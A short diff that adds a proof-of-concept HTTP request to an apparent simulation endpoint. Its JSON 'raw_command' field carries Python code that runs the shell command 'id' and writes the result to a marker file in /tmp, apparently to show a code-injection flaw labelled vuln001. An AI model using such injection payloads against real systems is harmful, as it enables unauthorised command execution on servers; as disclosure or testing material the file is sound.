@@ -1,0 +1,4 @@
+POST /_sim/raw-event  (Surface B direct invoke)
+Content-Type: application/json
+
+{"raw_command":"import os; open(\"/tmp/vuln001_<rand>\",\"w\").write(\"uid=\"+str(os.getuid())+\" | \"+os.popen(\"id\").read())"}
